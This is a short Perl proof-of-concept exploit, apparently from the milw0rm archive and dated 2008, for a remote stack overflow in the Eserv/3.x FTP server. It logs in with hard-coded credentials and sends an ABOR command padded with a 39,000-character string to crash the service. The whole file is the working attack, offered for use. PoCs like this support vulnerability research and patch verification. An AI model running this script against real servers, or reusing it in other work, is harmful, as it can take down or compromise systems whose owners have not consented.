#!/usr/bin/perl
#
# Eserv/3.x FTP Server (ABOR) Remote Stack Overflow PoC
#
# Summary: Eserv/3.x - Mail, News, Web and Proxy Servers - Mail
# Server (SMTP, IMAP4 and POP3) - News Server (NNTP) - Web Server
# (HTTP) - FTP Server - Proxy Servers (HTTP, FTP, Socks, etc) - Finger
# Server - Built-in scheduler and dialer.
#
# Product web page: http://www.eserv.ru/ | www.etype.net/eserv/
#
# Tested on Microsoft Windows XP SP2 (English)
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#
# liquidworm [t00t] gmail.com
#
# http://www.zeroscience.org
#
# 14.10.2008
#

use Net::FTP;

$ipaddr = "127.0.0.1";
$mana = "..?" x 13000;
$user = "admin";
$pass = "nimda";
$port = 21;

$ftp = Net::FTP->new("$ipaddr", Debug => 0) || die "Cannot connect to $ipaddr on port $port: $@";
$ftp->login($user,$pass) || die "Cannot login ", $ftp->message;

$ftp->abor($mana);

$ftp->quit;

print "\nDone!\n";

# milw0rm.com [2008-10-14]
